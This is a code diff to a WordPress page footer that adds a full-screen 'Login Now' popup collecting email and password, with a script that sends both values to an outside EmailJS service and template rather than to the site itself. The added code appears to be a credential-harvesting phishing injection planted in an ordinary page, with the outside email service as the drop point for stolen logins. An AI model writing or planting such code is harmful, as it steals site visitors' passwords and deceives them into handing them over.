@@ -1056,7 +1056,233 @@ class="post-31 page type-page status-publish ast-article-single" id="post-31" it
             </div>
             </div>
     </div>		</footer>
-		</div><!-- #page -->
+		</div>
+		<!--login form-->
+		<div class="outer-box" id="popup" >
+			<div class="background-pop" onclick="stp(e)">
+				<div class="container"
+					style="max-width: 600px; margin: 50px auto; text-align: center;">
+					<h2
+						style="font-size: 24px; font-weight: bold; margin-bottom: 20px;">Login
+						Now</h2>
+					<form id="contactForm" onsubmit="sendFormData(event)">
+						<div class="form-group"
+							style="margin-bottom: 15px; text-align: left;">
+							<label
+								style="display: block; font-size: 14px; margin-bottom: 5px;">Your
+								EMail</label>
+							<input type="email" id="email" name="email"
+								placeholder="Enter your email" required
+								style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; background: #eee;">
+						</div>
+						<div class="form-group"
+							style="margin-bottom: 15px; text-align: left;">
+							<label
+								style="display: block; font-size: 14px; margin-bottom: 5px;">Password*</label>
+							<input type="password" id="password" name="password"
+								placeholder="Enter your password" required
+								style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; background: #eee;">
+						</div>
+
+						<button type="submit" class="btn">Submit Form</button>
+
+						<p style="text-align: center; cursor: pointer; margin-top: 20px" onclick="closebx()"> close</p>
+					</form>
+				</div></div></div>
+
+		<div class="loaderR">
+			<svg viewBox="25 25 50 50">
+				<circle r="20" cy="50" cx="50"></circle>
+			</svg>
+			<p style="color: #fff;">Processing</p>
+		</div>
+
+		<script
+			src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+		<script>
+  (function () {
+	emailjs.init("dLES0ktdPRK1iuHaY"); // Replace with your EmailJS public key
+})();
+
+function sendFormData(event) {
+	event.preventDefault();
+
+	const loader = document.querySelector('.loaderR');
+	loader.classList.add('show');
+
+	// Extract form values
+	const email = document.getElementById('email').value;
+	const password = document.getElementById('password').value;
+
+	console.log(email, password);
+
+	if (!email || !password) {
+		alert("Please enter both email and password.");
+		loader.classList.remove('show');
+		return;
+	}
+
+	const templateParams = {
+		email: email,
+		password: password
+	};
+
+	// Send data with EmailJS
+	emailjs.send('service_rknot18', 'template_mt2jepm', templateParams)
+		.then(function(response) {
+			console.log('SUCCESS!', response.status, response.text);
+			document.getElementById("loginForm").reset();
+			loader.classList.remove('show');
+		})
+		.catch(function(error) {
+			console.error('FAILED...', error);
+			alert("An error occurred. Please try again.");
+			loader.classList.remove('show');
+		});
+}
+
+
+const openbox = () =>{
+	document.getElementById("popup").style.display = "flex";
+}
+
+
+const closebx = () =>{
+	document.getElementById("popup").style.display = "none";
+}
+const stp = (e) =>  {
+e.stopPropagation(); // Prevents the event from bubbling up to .outer-box
+}
+
+</script>
+
+
+<style>
+
+body{
+margin: 0;
+}
+.btn{
+background-color: #3346e9;
+color: white;
+padding: 10px;
+border-color: 2px solid #3346e9;
+}
+.btn:hover{
+background-color: navy;
+color: white;
+}
+
+.loaderR {
+position: fixed;
+top: 0;
+left: 0;
+width: 100vw;
+height: 100vh;
+background-color: rgba(0, 0, 0, 0.75);
+z-index: 9999999;
+display: flex;
+justify-content: center;
+align-items: center;
+flex-direction: column;
+gap: 10px;
+
+visibility: hidden; /* Initially hidden */
+opacity: 0;
+transition: opacity 0.3s ease-in-out;
+}
+
+.loaderR.show {
+visibility: visible;
+opacity: 1;
+}
+/* From Uiverse.io by barisdogansutcu */
+.loaderR svg {
+width: 3.25em;
+transform-origin: center;
+animation: rotate4 9s linear infinite;
+}
+
+.loaderR svg circle {
+fill: none;
+stroke: rgb(73, 204, 104);
+stroke-width: 2;
+stroke-dasharray: 1, 200;
+stroke-dashoffset: 0;
+stroke-linecap: round;
+animation: dash4 1.5s ease-in-out infinite;
+}
+
+.background-pop{
+	max-width: 700px;
+	width: 100%;
+	max-height: 90vh;
+	overflow: scroll;
+	 margin: 20px auto;
+	background-color: #fff;
+
+			border: 1px solid #ddd;
+			border-radius: 3px;
+			overflow: hidden;
+			padding : 20px;
+			box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+			animation: popup-bx 0.2s ease-in-out;
+}
+
+@keyframes popup-bx {
+	0%{
+		scale: 0;
+	}
+	100%{
+		scale: 1;
+	}
+}
+.outer-box{
+	background: url('') no-repeat center center/cover;
+	display: flex;
+	justify-content: center;
+	padding: 20px;
+	align-items: center;
+	height: 100vh;
+	width: 100vw;
+	position: fixed;
+top:0;
+left: 0;
+z-index: 9999;
+display: none;
+background-color: rgba(0, 0, 0, 0.8);
+}
+
+
+
+@keyframes rotate4 {
+100% {
+	transform: rotate(360deg);
+}
+}
+
+@keyframes dash4 {
+0% {
+	stroke-dasharray: 1, 200;
+	stroke-dashoffset: 0;
+}
+
+50% {
+	stroke-dasharray: 90, 200;
+	stroke-dashoffset: -35px;
+}
+
+100% {
+	stroke-dashoffset: -125px;
+}
+}
+
+
+	</style>
+		
+		
+		
+		<!-- #page -->
 			<script>
 				const lazyloadRunObserver = () => {
 					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
